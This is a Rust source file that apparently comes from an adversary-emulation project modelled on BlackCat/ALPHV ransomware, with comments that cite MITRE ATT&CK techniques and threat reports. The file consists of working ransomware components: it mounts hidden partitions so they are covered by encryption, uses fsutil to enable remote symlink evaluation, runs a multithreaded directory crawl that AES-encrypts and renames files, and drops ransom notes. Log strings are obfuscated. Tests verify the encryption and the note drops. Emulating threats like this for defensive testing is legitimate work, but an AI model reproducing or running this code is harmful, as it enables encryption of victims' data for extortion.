use std::collections::VecDeque;
use std::error::Error;
use std::fs::{create_dir, read_dir};
use std::path::Path;
use std::str;
use std::sync::{Arc, Mutex, atomic::{AtomicBool, AtomicU16, Ordering}};
use std::time::Duration;
use rand::{distributions::Alphanumeric, distributions::DistString, thread_rng};
use windows::core::PCWSTR;
use windows::Win32::Foundation::{ERROR_MORE_DATA, ERROR_NO_MORE_FILES, MAX_PATH};
use windows::Win32::Storage::FileSystem::{DeleteVolumeMountPointW, FindFirstVolumeW, FindNextVolumeW, FindVolumeClose, GetVolumePathNamesForVolumeNameW, SetVolumeMountPointW};
pub use crate::config::Host;
use crate::encrypt;
use crate::logger::{log_debug, log_error, log_info};
use crate::proc::exec_program;
use crate::winapi_helper::*;
use crate::windowscrate_helper::windows_get_last_error;
use encryptliterals::esl;

pub const ENUMERATE_ONLY:u32 = 0; // enumerate files only - no encryption/decryption
pub const ENUMERATE_AND_ENCRYPT:u32 = 1;

#[cfg(debug_assertions)]
pub const ENUMERATE_AND_DECRYPT:u32 = 2;

/**
 * mount_hidden_partitions
 *      About:
 *          Enumerates local partitions and mounts those that don't have volume paths, as they may be hidden partitions.
 *          This will allow the encryption functionality to target these partitions as well.
 *          Partitions are mounted to randomly generated subdirectories of C:\ so that they are included in the encryption routine.
 *      Result:
 *          Vector of strings representing the mount points for the mounted partitions, or error if unable to enumerate partitions.
 *      MITRE ATT&CK Techniques:
 *          T1490: Inhibit System Recovery
 *          T1082: System Information Discovery
 *      CTI:
 *          https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware
 *          https://www.varonis.com/blog/blackcat-ransomware
 */
pub fn mount_hidden_partitions() -> Result<Vec<String>, Box<dyn Error>> {
    // Reference: https://learn.microsoft.com/en-us/windows/win32/fileio/displaying-volume-paths
    const VOLUME_NAME_BUF_LEN: u32 = MAX_PATH + 1;
    let volume_name_buf = &mut [0 as u16; VOLUME_NAME_BUF_LEN as usize];
    let find_first_handle = unsafe {
        match FindFirstVolumeW(volume_name_buf) {
            Ok(r) => r,
            Err(e) => {
                Err(format!("{}: {}", esl!("FindFirstVolumeW failed"), e))?
            }
        }
    };

    if find_first_handle.is_invalid() {
        let last_error = windows_get_last_error();
        Err(format!("{} {}", esl!("FindFirstVolumeW returned invalid handle. Error code"), last_error))?
    }

    // Process each volume
    let mut mount_points = Vec::<String>::new();
    loop {
        let volume_name = from_wstring(volume_name_buf);
        log_debug(format!("{} {}", esl!("Processing volume"), volume_name));
        match process_volume(PCWSTR::from_raw(volume_name_buf.to_vec().as_ptr())) {
            Ok(mount_point) => {
                log_debug(format!("{} {}", esl!("Finished processing volume"), volume_name));
                if mount_point.len() > 0 {
                    log_info(format!("{} {} to {}", esl!("Mounted"), volume_name, mount_point));
                    mount_points.push(mount_point);
                }
            },
            Err(e) => {
                log_error(format!("{} {}: {}", esl!("Error processing volume"), volume_name, e));
            }
        }

        // Move on to next volume
        volume_name_buf.fill(0); // zero-out buffer just in case
        unsafe {
            match FindNextVolumeW(find_first_handle, volume_name_buf) {
                Ok(_) => {},
                Err(e) => {
                    if e.code() != ERROR_NO_MORE_FILES.to_hresult() {
                        log_error(format!("{} {}", esl!("FindNextVolumeW error code"), e.code().0));
                        match FindVolumeClose(find_first_handle) {
                            Ok(_) => { 
                                log_debug(String::from(esl!("Closed find volume handle."))); 
                            },
                            Err(e1) => {
                                log_error(format!("{}: {}", esl!("Failed to close find volume handle. Error code"), e1.code().0));
                            }
                        }
                        Err(format!("{} {}", esl!("FindNextVolumeW error code"), e.code().0))?
                    } else {
                        log_debug(String::from(esl!("Finished iterating through volumes.")));
                        break;
                    }
                }
            }
        }
    }

    unsafe {
        match FindVolumeClose(find_first_handle) {
            Ok(_) => { 
                log_debug(String::from(esl!("Closed find volume handle."))); 
            },
            Err(e) => Err(format!("{} {}", esl!("FindVolumeClose error code"), e.code().0))?
        }
    }

    Ok(mount_points)
}

// Checks if the volume has any volume paths. If not, attempts to mount the volume to a random subdirectory of C:\ and
// returns the mount point on success. Returns error on failure, empty string if volume has volume paths.
fn process_volume(volume_name_buf: PCWSTR) -> Result<String, Box<dyn Error>> {
    // Get volume paths to see if this volume is hidden
    let mut path_buf_len: u32= MAX_PATH + 1;
    let mut path_buf = vec![0 as u16; path_buf_len as usize];
    unsafe {
        match GetVolumePathNamesForVolumeNameW(volume_name_buf, Some(path_buf.as_mut_slice()), &mut path_buf_len) {
            Ok(_) => {},
            Err(e) => {
                if e.code() != ERROR_MORE_DATA.to_hresult() {
                    Err(format!("{}: {}", esl!("GetVolumePathNamesForVolumeNameW failed with error code"), e.code().0))?
                } else {
                    path_buf = vec![0 as u16; path_buf_len as usize];
                    match GetVolumePathNamesForVolumeNameW(volume_name_buf, Some(path_buf.as_mut_slice()), &mut path_buf_len) {
                        Ok(_) => {},
                        Err(e) => {
                            Err(format!("{}: {}", esl!("GetVolumePathNamesForVolumeNameW failed with error code"), e.code().0))?
                        }
                    };
                }
            }
        };
    }

    let path_name = from_wstring(&path_buf);
    if path_name.len() == 0 {
        log_info(String::from(esl!("No volume paths found. Mounting this volume.")));

        // Potential hidden volume - mount it
        let mount_point = generate_random_mount_point();
        create_dir(mount_point.clone())?;
        log_debug(format!("Using {} {}", mount_point, esl!("as the mount point.")));
        let mount_point_wstr = to_wstring(&mount_point);
        unsafe {
            match SetVolumeMountPointW(PCWSTR::from_raw(mount_point_wstr.to_vec().as_ptr()), volume_name_buf) {
                Ok(_) => {
                    return Ok(mount_point);
                },
                Err(e) => {
                    Err(format!("{}: {}", esl!("SetVolumeMountPointW failed with error code"), e.code().0))?
                }
            }
        }
    } else {
        log_debug(format!("{} {}. {}.", esl!("Found volume path name:"), path_name, esl!("Skipping mounting")));
    }

    Ok(String::from(""))
}

// Generate random subdir of C:\ to use as a mount point.
fn generate_random_mount_point() -> String {
    let mut mount_point;
    loop {
        let rand_name = Alphanumeric.sample_string(&mut thread_rng(), 10);
        mount_point = format!("{}\\{}\\", esl!("C:"), rand_name); // mount point must end in trailing backslash
        if !Path::new(&mount_point).exists() {
            break;
        }
    }
    return mount_point;     
}

// Unmount and delete folder mount_point
pub fn unmount_and_del_mount_point(mount_point: String) -> Result<(), Box<dyn Error>> {
    let mount_point_wstr = to_wstring(&mount_point);
    unsafe {
        match DeleteVolumeMountPointW(PCWSTR::from_raw(mount_point_wstr.to_vec().as_ptr())) {
            Ok(_) => {
                Ok(std::fs::remove_dir(Path::new(&mount_point))?)
            },
            Err(e) => Err(format!("{}: {}", esl!("DeleteVolumeMountPointW failed with error code"), e.code().0))?
        }
    }
}


#[cfg(debug_assertions)]
pub fn enumerate_dir_files(dir_path: &Path) -> Result<(), Box<dyn Error>> {
    let entries = read_dir(&dir_path)?;
    for entry in entries {
        let entry = entry?;
        let file_md = entry.metadata()?;
        let path = entry.path();
        if file_md.is_dir() {
            enumerate_dir_files(&path).unwrap_or_else(|e| {
                log_error(format!("{} {}: {}", esl!("Failed to enumerate files in"), path.display(), e));
            })
        } else {
            log_debug(format!("{}", path.display()))
        }
    }
    Ok(())
}


/**
 * enable_symbolic_links
 *      About:
 *          Uses fsutil to enable remote-to-local and remote-to-remote symbolic link evaluation
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 *          https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware
 *          https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/
 */
 pub fn enable_symbolic_links() -> Result<(), Box<dyn Error>> {
    // Remote-to-local
    match exec_program(esl!("fsutil").as_str(), &[esl!("behavior").as_str(), esl!("set").as_str(), esl!("SymlinkEvaluation").as_str(), esl!("R2L:1").as_str()]) {
        Ok(output) => {
            let stdout = str::from_utf8(&output.stdout)?;
            let stderr = str::from_utf8(&output.stderr)?;
            log_debug(format!("{}: {}", esl!("fsutil remote-to-local stdout"), stdout));
            log_debug(format!("{}: {}", esl!("fsutil remote-to-local stderr"), stderr));
        },
        Err(e) => {
            Err(format!("{}: {}", esl!("Failed to execute fsutil for remote-to-local symbolic links"), e))?
        }
    };

    // Remote-to-remote
    match exec_program(esl!("fsutil").as_str(), &[esl!("behavior").as_str(), esl!("set").as_str(), esl!("SymlinkEvaluation").as_str(), esl!("R2R:1").as_str()]) {
        Ok(output) => {
            let stdout = str::from_utf8(&output.stdout)?;
            let stderr = str::from_utf8(&output.stderr)?;
            log_debug(format!("{}: {}", esl!("fsutil remote-to-remote stdout"), stdout));
            log_debug(format!("{}: {}", esl!("fsutil remote-to-remote stderr"), stderr));
        },
        Err(e) => {
            Err(format!("{}: {}", esl!("Failed to execute fsutil for remote-to-local symbolic links"), e))?
        }
    };

    Ok(())
}

fn is_valid_processing_option(option: u32) -> bool {
    let options = vec![
        ENUMERATE_ONLY, 
        ENUMERATE_AND_ENCRYPT,

        #[cfg(debug_assertions)]
        ENUMERATE_AND_DECRYPT,
    ];
    return options.contains(&option);
}

/**
 * enumerate_and_encrypt
 *      About:
 *          Crawls through the local file directory to find files to encrypt, using worker threads from the threadpool.
 *          Encrypts the file if process_option is set to Encrypt, decrypts if set to Decrypt (debug only), 
 *          or does neither if set to EnumerateOnly.
 *          Will drop a ransom note in the directory if at least one file was processed.
 *      Result:
 *          Returns vector of discovered/encrypted files.
 *      MITRE ATT&CK Techniques:
 *          T1083: File and Directory Discovery
 *          T1486: Data Encrypted for Impact
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 *          https://securityintelligence.com/posts/blackcat-ransomware-levels-up-stealth-speed-exfiltration/
 *          https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB
 *          https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/
 *          https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware
 *          https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf
 */
pub fn enumerate_and_encrypt(pool: &rayon::ThreadPool, host: &Host, crawl_start: String) -> Result<Vec<String>, Box<dyn Error>> {
    enumerate_and_process(pool, host, crawl_start, ENUMERATE_AND_ENCRYPT)
}

/**
 * enumerate_and_process
 *      About:
 *          Crawls through the local file directory to find files to encrypt or decrypt, using worker threads from the threadpool.
 *          Encrypts the file if process_option is set to ENUMERATE_AND_ENCRYPT, decrypts if set to ENUMERATE_AND_DECRYPT (debug only), 
 *          or does neither if set to ENUMERATE_ONLY.
 *          Will drop a ransom note in the directory if at least one file was processed.
 *      Result:
 *          Returns vector of processed files.
 *      MITRE ATT&CK Techniques:
 *          T1083: File and Directory Discovery
 *          T1486: Data Encrypted for Impact
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 *          https://securityintelligence.com/posts/blackcat-ransomware-levels-up-stealth-speed-exfiltration/
 *          https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB
 *          https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/
 *          https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware
 *          https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf
 */
pub fn enumerate_and_process(pool: &rayon::ThreadPool, host: &Host, crawl_start: String, process_option: u32) -> Result<Vec<String>, Box<dyn Error>> {
    if !is_valid_processing_option(process_option) {
        Err(format!("{}: {}", esl!("Unsupported processing option: "), process_option))?
    }

    // Set starting directories
    let workload = {
        if host.get_strict_include_paths().is_empty() {
            Arc::new(Mutex::new(VecDeque::from([crawl_start]))) 
        } else {
            let mut to_process: Vec<String> = Vec::new();
            for path in host.get_strict_include_paths() {
                to_process.push(path.clone());
            }
            Arc::new(Mutex::new(VecDeque::from(to_process))) 
        }
    };
    let is_strict = !host.get_strict_include_paths().is_empty();

    // Will contain all of the encrypted files
    let processed_files = Arc::new(Mutex::new(Vec::<String>::new()));

    // Number of threads actively working on enumeration/encryption
    let active_thread_count = AtomicU16::new(0);

    // Will be set to true if workload is empty and active_thread_count is 0.
    let finished = AtomicBool::new(false);

    let aes_key = host.get_aes_key().clone();
    let excluded_dirs = host.get_excluded_directory_names().clone();
    let excluded_files = host.get_excluded_file_names().clone();
    let excluded_extensions = host.get_excluded_file_extensions().clone();
    let enc_extension = host.get_extension().clone();
    let note_file_name = host.get_note_file_name().clone();
    let note_contents = host.get_note_full_text().clone();

    // Kick off worker threads
    let workload_queue = workload.clone();
    pool.broadcast(|_| {
        let mut active: bool = false;
        loop {
            // grab directory from workload
            let to_process = { // hold workload_lock until we finished incrementing/decrementing active_thread_count
                let mut workload_lock = workload.lock().unwrap();
                match workload_lock.pop_front() {
                    Some(dir) => {
                        if !active {
                            active = true;
                            active_thread_count.fetch_add(1, Ordering::SeqCst);
                        }
                        dir
                    },
                    None => {
                        // if workload is currently empty and we are active, set active to false and decrement active_thread_count
                        if active {
                            active = false;
                            if active_thread_count.fetch_sub(1, Ordering::SeqCst) == 1 {
                                // if we are the last active thread, then enumeration/encryption is complete
                                finished.store(true, Ordering::Relaxed);
                            }
                        }
                        String::from("")
                    }
                }
                // workload_lock released here
            };

            if to_process.len() > 0 {
                // process directory
                let mut processed = process_directory(
                    &workload_queue,
                    to_process,
                    &aes_key,
                    &excluded_dirs, 
                    &excluded_files, 
                    &excluded_extensions, 
                    &enc_extension, 
                    &note_file_name,
                    &note_contents,
                    is_strict, 
                    process_option
                );

                // add processed files to processed_files
                processed_files.lock().unwrap().append(&mut processed);
            } else if finished.load(Ordering::Relaxed) {
                break;
            } else {
                std::thread::sleep(Duration::from_millis(200));
            }
        }
    });

    // Check every 2 seconds until finished
    loop {
        if finished.load(Ordering::Relaxed) {
            log_info(String::from(esl!("Finished enumerating and encrypting.")));
            break;
        } else {
            std::thread::sleep(Duration::from_secs(2));
        }
    }

    match Arc::try_unwrap(processed_files) {
        Ok(o) => Ok(o.into_inner()?),
        Err(_) => Err(String::from(esl!("Failed to access processed files vector from arc mutex")))?
    }
}

/// File discovery function - finds all valid files in a directory. If encrypt is true, attempts to encrypt them
fn process_directory(
    workload_queue: &Arc<Mutex<VecDeque<String>>>,
    crawl_start: String,
    aes_key: &[u8; 16],
    excluded_dirs: &Vec<String>, 
    excluded_files: &Vec<String>, 
    excluded_extensions: &Vec<String>, 
    enc_extension: &String, 
    note_file_name: &str,
    note_contents: &str,
    is_strict: bool, 
    process_option: u32
) -> Vec<String> {
    let mut processed_files: Vec<String> = Vec::new();
    let mut to_process: Vec<String> = Vec::new();

    // Creates an iterator containing all of the files 
    // in the directory we wish to crawl.
    if let Ok(entries) = read_dir(crawl_start.clone()) {
        let mut handle_note = false;
        for entry in entries {
            // If the entry we're iterating over is valid
            if let Ok(entry) = entry { 
                if let Ok(file_type) = entry.file_type() {
                    let file_name = match entry.file_name().into_string()  {
                        Ok(s) => s.to_lowercase(),
                        Err(_) => {
                            log_error(format!("File path {:?} {}", entry, esl!("could not be converted to string")));
                            continue
                        }
                    };

                    let path = entry.path();
                    let file_path = match path.to_str() {
                        Some(s) => s.to_string(),
                        None => {
                            log_error(format!("File path {:?} {}.", path, esl!("could not be converted to string")));
                            continue
                        }
                    };

                    // If no strict_includes, and directory is valid, add to workload
                    if !is_strict && file_type.is_dir() && !excluded_dirs.contains(&file_name) {
                        workload_queue.lock().unwrap().push_back(file_path);
                    } else if file_type.is_file() {
                        // If decrypting, check for encryption extension
                        #[cfg(debug_assertions)]
                        if process_option == ENUMERATE_AND_DECRYPT {
                            let file_extension = match path.extension() {
                                Some(s) => match s.to_os_string().into_string(){
                                    Ok(f) => f,
                                    Err(_) => continue
                                },
                                None => continue
                            };
                            let ext_with_dot = [".".to_owned(), file_extension].join("");
                            if String::from(enc_extension).eq(&ext_with_dot) {
                                handle_note = true;
                                to_process.push(file_path.clone());
                            }
                            continue
                        }
                        
                        if !excluded_files.contains(&file_name) {
                            let file_extension = match path.extension() {
                                Some(s) => match s.to_os_string().into_string(){
                                    Ok(f) => f,
                                    Err(_) => continue
                                },
                                None => continue
                            };
    
                            // If file has a valid extension, append to list
                            if !excluded_extensions.contains(&file_extension) {
                                match process_option {
                                    ENUMERATE_ONLY => {
                                        processed_files.push(file_path.clone());
                                    },
                                    _ => {
                                        // prioritize adding new directories to workload before starting to encrypt/decrypt anything
                                        to_process.push(file_path.clone());
                                    },
                                } 
                            }
                        }
                    }               
                }
            }
        }

        // Encrypt or decrypt files, if any
        for file_path in to_process {
            match process_option {
                ENUMERATE_AND_ENCRYPT => {
                    match encrypt::encrypt(&file_path, enc_extension, aes_key) {
                        Ok(_) => {
                            processed_files.push(file_path.clone());
                            handle_note = true;
                            log_debug(format!("{} {}", esl!("Encrypted"), file_path));
                        },
                        Err(e) => log_error(format!("{} {} : {:?}", esl!("Failed to encrypt"), file_path, e))
                    }
                },
                #[cfg(debug_assertions)]
                ENUMERATE_AND_DECRYPT => {
                    match encrypt::decrypt(&file_path, aes_key) {
                        Ok(p) => {
                            processed_files.push(p.clone());
                            handle_note = true;
                            log_debug(format!("{} {} to {}", esl!("Decrypted"), file_path, p));
                        },
                        Err(e) => log_error(format!("{} {} : {:?}", esl!("Failed to decrypt"), file_path, e))
                    }
                },
                _ => {},
            }
        }
        
        if handle_note {
            match process_option {
                ENUMERATE_AND_ENCRYPT => {
                    encrypt::drop_ransom_note(crawl_start, &note_file_name, &note_contents);
                },
                #[cfg(debug_assertions)]
                ENUMERATE_AND_DECRYPT => {
                    encrypt::remove_ransom_note(crawl_start, &note_file_name);
                },
                _ => {},
            }
        }
    }

    return processed_files;
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs::{File, create_dir, remove_dir_all, read, read_to_string, write};
    use std::io::Read;
    use std::path::Path;
    use crate::encrypt::decrypt;
    use serial_test::serial;
    pub use crate::config::validate_access_token;

    /// Test when strict_include_path is empty
    #[cfg(target_os = "windows")]
    #[test]
    #[serial]
    fn test_empty_strict_include_path() {
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let mut h = Host::new(config);
        h.set_strict_include_paths(&mut Vec::new());
        h.set_note_file_name(String::from(""));

        h.append_exclude_directory_names(&mut vec!["blackcattest".to_string()]);
        
        let dir = ".\\blackcattest";
        let path = ".\\blackcattest\\filetest.txt";

        if Path::new(dir).exists() {
            remove_dir_all(dir).unwrap();
        }
        create_dir(dir).unwrap();
        File::create(path).unwrap();

        let pool = rayon::ThreadPoolBuilder::new().num_threads(5).build().unwrap();
        let files = enumerate_and_process(&pool, &h, ".".to_string(), ENUMERATE_ONLY).unwrap();

        assert!(!files.contains(&path.to_string().to_lowercase()));

        remove_dir_all(dir).unwrap();
    }

    /// Test when strict_include_path is not empty
    #[cfg(target_os = "windows")]
    #[test]
    #[serial]
    fn test_strict_include_path() {
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let mut h = Host::new(config);

        let dir = ".\\blackcattest";

        h.set_strict_include_paths(&mut vec![dir.to_string().to_lowercase()]);

        let path = ".\\blackcattest\\filetest.txt";
        
        if Path::new(dir).exists() {
            remove_dir_all(dir).unwrap();
        }
        create_dir(dir).unwrap();
        File::create(path).unwrap();

        let pool = rayon::ThreadPoolBuilder::new().num_threads(5).build().unwrap();
        let files = enumerate_and_process(&pool, &h, ".".to_string(), ENUMERATE_ONLY).unwrap();

        assert!(files.contains(&path.to_string().to_lowercase()));

        remove_dir_all(dir).unwrap();
    }

    // Test ransom note drop and file got encrypted
    #[test]
    #[serial]
    fn test_ransom_note_drop() {
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let mut h = Host::new(config);
        h.set_aes_key([0x42;16]);

        let dir = {
            #[cfg(target_os = "windows")] {
                ".\\blackcattest"
            }

            #[cfg(unix)] {
                "./blackcattest"
            }
        };

        let path = {
            #[cfg(target_os = "windows")] {
                String::from(".\\blackcattest\\filetest.txt")
            }

            #[cfg(unix)] {
                String::from("./blackcattest/filetest.txt")
            }
        };
        
        let plaintext = b"hello world! this is my plaintext.";
        let key = *h.get_aes_key();

        h.set_strict_include_paths(&mut vec![dir.to_string().to_lowercase()]);

        if Path::new(dir).exists() {
            remove_dir_all(dir).unwrap();
        }
        create_dir(dir).unwrap();
        File::create(path.clone()).unwrap();
        write(path.clone(), plaintext).unwrap();

        let pool = rayon::ThreadPoolBuilder::new().num_threads(5).build().unwrap();
        let _files = enumerate_and_process(&pool, &h, ".".to_string(), ENUMERATE_AND_ENCRYPT).unwrap();

        // Ransom note exists
        let ransom = dir.to_owned() + "\\" + &h.get_note_file_name();
        let ransom_path = Path::new(&ransom);
        assert!(ransom_path.exists());

        // Ransom note contents are valid
        let mut note = File::open(ransom_path).expect("Error opening ransom note");
        let mut contents = String::from("");
        note.read_to_string(&mut contents).unwrap();
        assert_eq!(&contents, h.get_note_full_text());

        // Test file exists and got encrypted properly
        let mut path_with_extension = path.clone();
        path_with_extension.push_str(h.get_extension());
        assert!(Path::new(&path_with_extension).exists());
        decrypt(&path_with_extension, &key).unwrap();
        assert!(!Path::new(&path_with_extension).exists());
        assert!(Path::new(&path).exists());
        let decrypted_contents = read_to_string(&path).expect("Unable to read decrypted file");
        assert_eq!(plaintext, decrypted_contents.as_bytes());
        
        remove_dir_all(dir).unwrap();
    }

    #[cfg(target_os = "windows")]
    #[test]
    #[serial]
    fn test_full_encrypt() {
        /*
         * Test file structure:
         *      ./blackcattestenumenc
         *          file.txt
         *          file2.txt
         *          ntuser.dat // SKIP
         *          log.xtlog // SKIP
         *          dir1/ // SKIP
         *              file.ico //SKIP
         *              ntuser.ini // SKIP
         *          dir2/
         *              file.doc
         *              gooddir/
         *                  file.txt
         *                  dira/
         *                      file.pdf
         *                      file.log
         *                      dirb/
         *                          file.jpg
         *              application data/ // SKIP
         *                  file.txt
         *          dir3/ // SKIP
         *          files/
         *              mozilla/ // SKIP
         *              file.pptx
         *              file.bat // SKIP
         *              thumbs.db // SKIP
         *          System Volume Information // SKIP
         *              dir1/
         *                  file.pdf
         *                  file.log
         *              dir2/
         *          Intel/ //SKIP
         *              file.txt
         *          Program Files/ // SKIP
         *              file.txt
         */
        
         // Set up test environment
         let start_dir = ".\\blackcattestenumenc";

        let directories = vec![
            ".\\blackcattestenumenc", 
            ".\\blackcattestenumenc\\dir1",
            ".\\blackcattestenumenc\\dir2",
            ".\\blackcattestenumenc\\dir2\\gooddir",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira\\dirb",
            ".\\blackcattestenumenc\\dir2\\application data",
            ".\\blackcattestenumenc\\dir3",
            ".\\blackcattestenumenc\\files",
            ".\\blackcattestenumenc\\files\\mozilla",
            ".\\blackcattestenumenc\\System Volume Information",
            ".\\blackcattestenumenc\\System Volume Information\\dir1",
            ".\\blackcattestenumenc\\System Volume Information\\dir2",
            ".\\blackcattestenumenc\\Intel",
            ".\\blackcattestenumenc\\Program Files",
        ];

        let skipped_directories = vec![
            ".\\blackcattestenumenc\\dir1",
            ".\\blackcattestenumenc\\dir2\\application data",
            ".\\blackcattestenumenc\\dir3",
            ".\\blackcattestenumenc\\files\\mozilla",
            ".\\blackcattestenumenc\\System Volume Information",
            ".\\blackcattestenumenc\\System Volume Information\\dir1",
            ".\\blackcattestenumenc\\System Volume Information\\dir2",
            ".\\blackcattestenumenc\\Intel",
            ".\\blackcattestenumenc\\Program Files",
        ];

        let affected_directories = vec![
            ".\\blackcattestenumenc", 
            ".\\blackcattestenumenc\\dir2",
            ".\\blackcattestenumenc\\dir2\\gooddir",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira\\dirb",
            ".\\blackcattestenumenc\\files",
        ];

        let files = vec![
            ".\\blackcattestenumenc\\ntuser.dat", // SKIP
            ".\\blackcattestenumenc\\log.xtlog", // SKIP
            ".\\blackcattestenumenc\\file.txt",
            ".\\blackcattestenumenc\\file2.txt",
            ".\\blackcattestenumenc\\dir1\\file.ico", // SKIP
            ".\\blackcattestenumenc\\dir1\\ntuser.ini", // SKIP
            ".\\blackcattestenumenc\\dir2\\file.doc",
            ".\\blackcattestenumenc\\dir2\\gooddir\\file.txt",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira\\file.pdf",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira\\file.log",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira\\dirb\\file.jpg",
            ".\\blackcattestenumenc\\dir2\\application data\\file.txt", // SKIP
            ".\\blackcattestenumenc\\files\\file.pptx",
            ".\\blackcattestenumenc\\files\\file.bat", // SKIP
            ".\\blackcattestenumenc\\files\\thumbs.db", // SKIP
            ".\\blackcattestenumenc\\System Volume Information\\dir1\\file.pdf", // SKIP
            ".\\blackcattestenumenc\\System Volume Information\\dir1\\file.log", // SKIP
            ".\\blackcattestenumenc\\Intel\\file.txt", // SKIP
            ".\\blackcattestenumenc\\Program Files\\file.txt", // SKIP
        ];

        let skipped_files = vec![
            ".\\blackcattestenumenc\\ntuser.dat",
            ".\\blackcattestenumenc\\log.xtlog",
            ".\\blackcattestenumenc\\dir1\\file.ico",
            ".\\blackcattestenumenc\\dir1\\ntuser.ini", 
            ".\\blackcattestenumenc\\dir2\\application data\\file.txt", 
            ".\\blackcattestenumenc\\files\\file.bat", 
            ".\\blackcattestenumenc\\files\\thumbs.db", 
            ".\\blackcattestenumenc\\System Volume Information\\dir1\\file.pdf", 
            ".\\blackcattestenumenc\\System Volume Information\\dir1\\file.log", 
            ".\\blackcattestenumenc\\Intel\\file.txt",
            ".\\blackcattestenumenc\\Program Files\\file.txt",
        ];

        let mut affected_files = vec![
            ".\\blackcattestenumenc\\file.txt",
            ".\\blackcattestenumenc\\file2.txt",
            ".\\blackcattestenumenc\\dir2\\file.doc",
            ".\\blackcattestenumenc\\dir2\\gooddir\\file.txt",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira\\file.pdf",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira\\file.log",
            ".\\blackcattestenumenc\\dir2\\gooddir\\dira\\dirb\\file.jpg",
            ".\\blackcattestenumenc\\files\\file.pptx",
        ];

        if Path::new(start_dir).exists() {
            remove_dir_all(start_dir).unwrap();
        }

        for dir in directories {
            create_dir(dir).unwrap();
        }
        
        let plaintext = [1u8; 1600];
        for path in files {
            File::create(path.clone()).unwrap();
            write(path.clone(), plaintext).unwrap();
        }

        // run the enumeration and encryption
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let mut h = Host::new(config);
        encrypt::set_aes_key(&mut h);

        let pool = rayon::ThreadPoolBuilder::new().num_threads(5).build().unwrap();
        let mut encrypted_files = enumerate_and_process(&pool, &h, start_dir.to_owned(), ENUMERATE_AND_ENCRYPT).unwrap();
        encrypted_files.sort();
        affected_files.sort();

        // Check that expected files were affected
        assert_eq!(encrypted_files, affected_files);

        // Verify untouched directories - make sure no ransom note
        for dir in skipped_directories {
            assert!(!Path::new(dir).join(h.get_note_file_name()).exists());
        }

        // Verify untouched files
        for file in skipped_files {
            let ext_path = format!("{}{}", file, h.get_extension());
            assert!(!Path::new(&ext_path).exists());
            assert!(Path::new(&file).exists());
            let contents = read(&file).unwrap();
            assert_eq!(contents.as_slice(), plaintext);
        }

        // Verify affected directories - check for ransom note
        for dir in affected_directories {
            assert!(Path::new(dir).join(h.get_note_file_name()).exists());
        }

        // Verify file encryption
        for file in affected_files {
            let enc_file = format!("{}{}", file, h.get_extension());
            assert!(Path::new(&enc_file).exists(), "{} doesn't exist", &enc_file);
            assert!(!Path::new(&file).exists(), "{} exists when it shouldn't", &file);
            let enc_contents = read(&enc_file).unwrap();
            assert_eq!(enc_contents.as_slice(), plaintext);
            
            // Decrypt
            decrypt(&enc_file, h.get_aes_key()).unwrap();
            assert!(!Path::new(&enc_file).exists());
            assert!(Path::new(&file).exists());
            let decrypted_contents = read(&file).expect("Unable to read decrypted file");
            assert_eq!(plaintext, decrypted_contents.as_slice());
        }

        // Cleanup
        remove_dir_all(start_dir).unwrap();
    }
}